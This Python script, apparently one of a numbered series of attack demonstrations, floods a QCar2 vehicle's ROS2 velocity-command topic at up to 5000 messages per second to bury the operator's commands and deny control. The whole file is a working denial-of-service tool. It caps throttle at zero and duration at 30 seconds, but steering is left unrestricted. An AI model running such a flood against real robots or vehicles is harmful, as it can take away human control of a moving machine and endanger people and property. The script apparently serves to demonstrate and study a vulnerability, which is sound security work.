#!/usr/bin/env python3
"""
cmd_flood.py
============
Attack 4 -- Command Flooding / Denial of Service

Floods /qcar2/cmd_vel at a high packet rate, burying legitimate operator
commands and causing the QCar's actuator thread to drop real navigation
commands. Demonstrates how an attacker can deny vehicle control without
needing physical access.

Usage:
    python3 cmd_flood.py
    python3 cmd_flood.py --rate 2000 --duration 10
    python3 cmd_flood.py --rate 500  --duration 5 --throttle 0.0

Safety limits (enforced):
    Max throttle : 0.0  (flood uses zero motion by default -- DoS only)
    Max duration : 30 seconds
    Max rate     : 5000 Hz

Run ros2 topic hz /qcar2/cmd_vel on the operator machine during the attack
to observe the legitimate command rate being overwhelmed.
"""

import argparse
import time
import threading

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy
from geometry_msgs.msg import Twist

# ── Safety limits ─────────────────────────────────────────────────────────────
MAX_THROTTLE = 0.0    # zero motion — demonstrate queue saturation, not movement
MAX_DURATION = 30.0
MAX_RATE     = 5000


class FloodNode(Node):

    def __init__(self, rate_hz: int, throttle: float, steering: float):
        super().__init__('cmd_flood_node')

        # BEST_EFFORT QoS -- maximises throughput, no retransmits
        qos = QoSProfile(
            depth=1000,
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
        )
        self.pub      = self.create_publisher(Twist, '/qcar2/cmd_vel', qos)
        self.rate     = rate_hz
        self.throttle = throttle
        self.steering = steering
        self._stop    = threading.Event()

    def flood(self, duration_s: float):
        msg           = Twist()
        msg.linear.x  = self.throttle
        msg.angular.z = self.steering

        interval = 1.0 / self.rate
        t_end    = time.perf_counter() + duration_s
        count    = 0
        t_report = time.perf_counter() + 1.0

        print()
        print('=' * 55)
        print('  Attack 4: Command Flood / Denial of Service')
        print('=' * 55)
        print(f'  Topic    : /qcar2/cmd_vel')
        print(f'  Rate     : {self.rate} Hz')
        print(f'  Duration : {duration_s:.0f}s')
        print(f'  Throttle : {self.throttle:.2f}  (0.0 = DoS only, no motion)')
        print(f'  Steering : {self.steering:.2f}')
        print()
        print('  On operator machine, watch legitimate rate get buried:')
        print('    ros2 topic hz /qcar2/cmd_vel')
        print()
        print('  Flooding...')
        print('=' * 55)

        while time.perf_counter() < t_end and not self._stop.is_set():
            self.pub.publish(msg)
            count += 1

            now = time.perf_counter()
            if now >= t_report:
                elapsed  = duration_s - (t_end - now)
                actual_hz = count / max(elapsed, 0.001)
                print(f'  [{elapsed:5.1f}s]  sent={count:6d}  '
                      f'actual rate={actual_hz:.0f} Hz')
                t_report = now + 1.0

            time.sleep(interval)

        elapsed = duration_s - max(t_end - time.perf_counter(), 0)
        actual_rate = count / max(elapsed, 0.001)

        # Send stop command
        stop = Twist()
        self.pub.publish(stop)

        print()
        print('=' * 55)
        print(f'  Flood complete.')
        print(f'  Sent     : {count} packets in {elapsed:.1f}s')
        print(f'  Actual   : {actual_rate:.0f} Hz')
        print(f'  Expected : {self.rate} Hz')
        print()
        print('  Stop command sent. Legitimate control should resume.')
        print('  Measure recovery time with:')
        print('    ros2 topic hz /qcar2/cmd_vel')
        print('=' * 55)


def main():
    ap = argparse.ArgumentParser(
        description='Attack 4: Command Flood / DoS against QCar2')
    ap.add_argument('--rate',     type=int,   default=1000,
                    help=f'Flood rate in Hz (max {MAX_RATE}, default 1000)')
    ap.add_argument('--duration', type=float, default=10.0,
                    help=f'Duration in seconds (max {MAX_DURATION}, default 10)')
    ap.add_argument('--throttle', type=float, default=0.0,
                    help='Throttle in flood messages (default 0.0 -- no motion)')
    ap.add_argument('--steering', type=float, default=0.0,
                    help='Steering in flood messages (default 0.0)')
    args = ap.parse_args()

    # Enforce safety limits
    rate     = min(args.rate,     MAX_RATE)
    duration = min(args.duration, MAX_DURATION)
    throttle = max(-MAX_THROTTLE, min(MAX_THROTTLE, args.throttle))
    steering = args.steering

    rclpy.init()
    node = FloodNode(rate, throttle, steering)
    try:
        node.flood(duration)
    except KeyboardInterrupt:
        print('\n[INFO] Interrupted by user. Sending stop command.')
        stop = Twist()
        node.pub.publish(stop)
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
